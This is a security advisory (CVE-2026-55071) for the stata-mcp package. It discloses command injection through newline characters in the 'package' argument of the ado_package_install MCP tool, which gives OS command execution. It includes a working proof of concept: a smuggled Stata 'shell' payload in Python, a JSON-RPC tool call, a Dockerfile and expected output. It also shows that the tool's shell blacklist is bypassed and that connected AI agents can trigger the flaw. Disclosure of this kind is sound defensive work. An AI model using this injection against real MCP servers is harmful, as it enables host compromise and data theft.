# [H] MCP-for-Stata: Stata Command Injection via Unsanitized `package` in `ado_package_install`

## Summary
Severity: High
Advisory: GHSA-49m4-vp58-wgc9
CVE: CVE-2026-55071
CWE: CWE-94
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-12
Source: https://github.com/advisories/GHSA-49m4-vp58-wgc9
Type: github-advisory

## Affected
- PyPI: `stata-mcp` — affected >=0 <1.19.0

## Details
## Stata Command Injection via Unsanitized `package` in `ado_package_install`

### Summary

The `ado_package_install` MCP tool in `stata-mcp` concatenates user-controlled input directly into a Stata command string without any validation or sanitization. An attacker who can invoke the MCP tool or the equivalent Python API can embed newline characters in the `package` argument to inject arbitrary Stata commands. Because Stata supports a `shell` escape command, this leads to full OS-level arbitrary command execution (RCE) under the account running the Stata-MCP server. The tool is registered in the default `all` profile, so no non-default configuration is required. Base CVSS score is **8.4 (High)**.

### Details

The vulnerability originates in `SSC_Install.install()`:

```python
# src/stata_mcp/stata/builtin_tools/ado_install/ssc_install.py:14-16
def install(self, package: str) -> str:
    install_command = f"ssc install {package}{self.REPLACE_MESSAGE}"
    runner_result = self.controller.run(install_command)
```

The `package` parameter is interpolated into an f-string with no allowlist check, newline rejection, or quoting. The resulting command string is forwarded to the Stata interpreter verbatim:

```python
# src/stata_mcp/stata/stata_controller/controller.py:98-99
# Send the command
self.child.sendline(command)
```

`pexpect.sendline()` writes the full multi-line string to the Stata REPL, which executes each line as a separate Stata command. Because Stata's `shell` (and `!`) commands execute an OS shell command, a newline-delimited payload results in OS command execution.

The full source-to-sink data flow is:

1. **Exposure** — `src/stata_mcp/mcp_servers.py:626-632`: `_TOOL_REGISTRY` registers `ado_package_install` in the `all` profile.
2. **Default activation** — `src/stata_mcp/cli/_handlers.py:295-300`: when no `--core`/`--all` flag is given the profile defaults to `all`, so the tool is always enabled.
3. **Propagation** — `src/stata_mcp/mcp_servers.py:308-349`: the MCP argument `package` is passed to `installer(...).install(*args)` without validation.
4. **Sink construction** — `src/stata_mcp/stata/builtin_tools/ado_install/ssc_install.py:15`: `package` is interpolated into `install_command`.
5. **Delivery** — `src/stata_mcp/stata/stata_controller/controller.py:99`: `self.child.sendline(command)` sends the attacker-influenced string to Stata.

A guard/blacklist (`src/stata_mcp/guard/blacklist.py:41-60`) registers `shell`, `!`, `winexec`, `unixcmd`, and similar strings as dangerous commands, but the `GuardValidator` that enforces this list is invoked **only** on the `stata_do` path and is not called anywhere in the ado-install path, making the guard entirely ineffective against this attack.

### PoC

**Prerequisites**

- Unix-like host with a configured Stata CLI, **or** use the provided Docker image which replaces the Stata binary with a minimal Python stub (`fake_stata.py`) that honours the `shell` command.

**Container-based reproduction (no Stata license required)**

```bash
# Build (run from the repository root)
docker build -t stata-mcp-poc-001 \
    -f vuln-001/Dockerfile \
    reports/pypiAi_828_SepineTam__stata-mcp/

# Run
docker run --rm stata-mcp-poc-001
```

**Direct Python trigger (unmodified source)**

```python
import os
from stata_mcp.stata.builtin_tools.ado_install.ssc_install import SSC_Install

MARKER = "/tmp/stata_mcp_ado_poc"
PAYLOAD = f"outreg2\nshell touch {MARKER}\n//"

installer = SSC_Install("/usr/local/bin/stata", is_replace=True, timeout=10)
installer.install(PAYLOAD)

assert os.path.exists(MARKER), "RCE not confirmed"
print("RCE CONFIRMED — marker file created")
```

The payload `"outreg2\nshell touch /tmp/stata_mcp_ado_poc\n//"` is expanded by the f-string at `ssc_install.py:15` into:

```
ssc install outreg2
shell touch /tmp/stata_mcp_ado_poc
//, replace
```

Stata executes the second line as an OS shell command. The trailing `//` comment neutralises the `, replace` suffix so Stata does not raise a syntax error.

**MCP JSON-RPC trigger**

```json
{
  "tool": "ado_package_install",
  "arguments": {
    "source": "ssc",
    "package": "outreg2\nshell touch /tmp/stata_mcp_ado_poc\n//",
    "is_replace": true
  }
}
```

**Expected output**

```
[+] PASS - RCE CONFIRMED
[+] Marker file exists: /tmp/stata_mcp_ado_poc
[+] The injected Stata 'shell' command was executed by the REPL.
```

Phase 2 dynamic reproduction confirmed the marker file `/tmp/stata_mcp_ado_poc` was created inside the Docker container, and `install()` returned a string containing the injected command:

```
Installation State: False
ssc install outreg2\r\nshell touch /tmp/stata_mcp_ado_poc\r\n//, replace
```

### Impact

This is a **Code/Command Injection (RCE)** vulnerability. Any principal who can call the `ado_package_install` MCP tool or the equivalent Python API — including an AI model or agent connected to the MCP server, a local script, or a remote HTTP client if the HTTP transport is exposed — can execute arbitrary OS commands with the privileges of the user running the Stata-MCP server.

Because the tool is registered in the default `all` profile and `all` is the default active profile, **no misconfiguration by the victim is required**. All users of `stata-mcp` on the affected version who run `stata-mcp server` are impacted.

Concrete consequences include: exfiltration of credentials and data accessible to the process, persistence via cron/startup entries, lateral movement within the local network, and complete compromise of the host user account.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# Dockerfile for VULN-001 dynamic reproduction
# Build context must be the parent directory:
#   docker build -t stata-mcp-poc-001 -f vuln-001/Dockerfile .
#
# Vulnerability: Stata Command Injection via unsanitized `package` in
#   SSC_Install.install() (ssc_install.py:15).
#
# Strategy: replace the real Stata binary with a minimal Python script
#   (fake_stata.py) that honours the 'shell <cmd>' Stata command.
#   The vulnerable stata-mcp code is installed unmodified from the repo.

FROM python:3.11-slim

# Install pexpect -- the only runtime dependency required by the PoC
# (StataController imports pexpect; all other imports are stdlib-only).
RUN pip install --no-cache-dir pexpect==4.9.0

# ------------------------------------------------------------------
# Fake Stata binary
# ------------------------------------------------------------------
# Placed at /usr/local/bin/stata so StataFinder (Linux) can auto-discover
# it and the PoC can reference it by absolute path.
COPY vuln-001/fake_stata.py /usr/local/bin/stata
RUN chmod +x /usr/local/bin/stata

# ------------------------------------------------------------------
# Vulnerable package (unmodified source)
# ------------------------------------------------------------------
COPY repo/src /workspace/src
ENV PYTHONPATH=/workspace/src

# ------------------------------------------------------------------
# PoC script
# ------------------------------------------------------------------
COPY vuln-001/poc.py /workspace/poc.py

WORKDIR /workspace
CMD ["python3", "/workspace/poc.py"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC for VULN-001: Stata Command Injection via unsanitized `package` in
`ado_package_install` (SSC path).

Vulnerable code:
    ssc_install.py:15
        install_command = f"ssc install {package}{self.REPLACE_MESSAGE}"
    controller.py:99
        self.child.sendline(command)

Attack: embed a newline in `package` to inject an additional Stata command.
    package = "outreg2\\nshell touch /tmp/stata_mcp_ado_poc\\n//"

The constructed command string becomes:
    ssc install outreg2
    shell touch /tmp/stata_mcp_ado_poc
    //, replace

pexpect delivers this multi-line string verbatim to the Stata REPL via
sendline(), causing Stata to execute 'shell touch /tmp/stata_mcp_ado_poc',
which runs the OS command 'touch /tmp/stata_mcp_ado_poc'.

Marker file creation confirms RCE.
"""
import os
import sys

FAKE_STATA = "/usr/local/bin/stata"
MARKER_FILE = "/tmp/stata_mcp_ado_poc"
# Payload: legit package name, then injected shell command, then comment to
# neutralise the ", replace" suffix appended by REPLACE_MESSAGE.
PAYLOAD = f"outreg2\nshell touch {MARKER_FILE}\n//"


def main() -> int:
    print("=" * 60)
    print("VULN-001 PoC: Stata Command Injection via ado_package_install")
    print("=" * 60)
    print(f"[*] Fake Stata binary : {FAKE_STATA}")
    print(f"[*] Marker file       : {MARKER_FILE}")
    print(f"[*] Payload (repr)    : {PAYLOAD!r}")
    print()

    # Clean up any previous run.
    if os.path.exists(MARKER_FILE):
        os.remove(MARKER_FILE)
        print(f"[*] Removed pre-existing marker file.")

    # Import the vulnerable class directly -- no MCP or config layer needed.
    # The vulnerability lives entirely in SSC_Install.install() and the
    # StataController that sends the command to the Stata REPL.
    from stata_mcp.stata.builtin_tools.ado_install.ssc_install import SSC_Install

    print("[*] Instantiating SSC_Install with fake Stata binary...")
    installer = SSC_Install(FAKE_STATA, is_replace=True, timeout=10)

    print(f"[*] Calling install({PAYLOAD!r}) ...")
    try:
        result = installer.install(PAYLOAD)
        print(f"[*] install() returned: {result[:200]!r}")
    except Exception as exc:
        # A RuntimeError from StataController is acceptable; the shell command
        # may have already executed before the error is detected.
        print(f"[!] install() raised (may be expected): {type(exc).__name__}: {exc}")

    print()

    # --- Verdict ---
    if os.path.exists(MARKER_FILE):
        print("[+] PASS - RCE CONFIRMED")
        print(f"[+] Marker file exists: {MARKER_FILE}")
        print("[+] The injected Stata 'shell' command was executed by the REPL.")
        print("[+] Constructed command delivered via sendline():")
        print("[+]   ssc install outreg2")
        print(f"[+]   shell touch {MARKER_FILE}  <-- OS command executed here")
        print("[+]   //")
        return 0
    else:
        print("[-] FAIL - Marker file not found.")
        print("[-] The injected shell command did not produce the expected artefact.")
        return 1


if __name__ == "__main__":
    sys.exit(main())
```

## References
- https://github.com/SepineTam/mcp-for-stata/security/advisories/GHSA-49m4-vp58-wgc9
- https://github.com/SepineTam/mcp-for-stata
- https://github.com/SepineTam/mcp-for-stata/releases/tag/v1.19.0
